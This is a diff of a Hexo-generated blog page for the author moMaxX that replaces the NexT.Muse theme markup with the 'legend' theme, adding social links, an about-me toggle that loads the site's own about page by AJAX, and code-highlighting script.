-    <span class="toggle-line toggle-line-last"></span>
+
+
+
+<div id="me-button">
+		<img id="play-img" src="/images/me_n.png">
+		</img>
+</div>
+
+<div id="social-div">
+
+
+    
+    
+    <a class="social-a" href="http://weibo.com/3169700852/" target="_blank">
+        <img src="/images/weibo.png">
+    </a>
+    
+
+    
+    
+    <a class="social-a" href="https://github.com/iHongRen" target="_blank">
+        <img src="/images/github.png">
+    </a>
+    
+
+    
+    
+    <a class="social-a" href="https://twitter.com/ihongren" target="_blank">
+        <img src="/images/twitter.png">
+    </a>
+    
+
+
+</div>
+
+
+<div id="about-me">
+  <div id="about-me-inner">
+    <article class="markdown-body"></article>
   </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">moMaxX</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">16</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-  </nav>
 </div>
 
 
+<!--[if lt IE 9]>
+<script>
+	document.createElement('video');
+</script>
+<![endif]-->
 
-      </div>
+
+<script>
+
+$(document).ready(function(){
+  //判断是否该显示’关于我‘
+  if( "home_about"  == 'home_about') {
+    $("#about-me").hide(0);
+
+    //加载about(关于)读取文件
+    var s = $('article').html();
+    if (s.length < 2) {
+      var url = window.location.protocol+"//"+window.location.host+"/about/";
+      $.ajax({ 
+          type: "GET", 
+          url: url, 
+          dataType: "html", 
+          success: function (data) { 
+            $('article').html($(data).find('article').html());//解析about的html
+            $("#about-me").css({"visibility": "visible"}).delay(100);
+            $("#about-me").slideToggle('slow');
+          }
+      }); 
+      }
+
+    //个人按钮点击，隐藏和显示关于界面
+    $("#me-button").click(function(){ 
+      $("#social-div").slideToggle();
+      $("#about-me").slideToggle();
+    });
+  }
+});
+</script>
+
+
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">moMaxX</span>
+  </div>
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+
+
+
+<div id="bottom-outer">
+  
+  <div id="bottom-inner">
+    moMaxX 
+    ©2020 |Powered by  
+    <a href="http://hexo.io" target="_blank">Hexo</a> with theme 
+    <a href="https://github.com/iHongRen/legend" target="_blank">legend</a>
   </div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
+    
+    
+    
+      <a href="/atom.xml">
+      
+      <img src=/images/rss.png height="18" width="18">
+      
+</div> 
 
 
   
-
-
-
-
   
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
+    <script src="/js/legend.js"></script>
   
 
-  
 
 </body>
 </html>
+
+
+<script>
+$(window).on('load', function(){
+   $('pre').addClass('prettyprint').attr('style', 'overflow:auto;');
+   prettyPrint();
+ });
+</script>
+
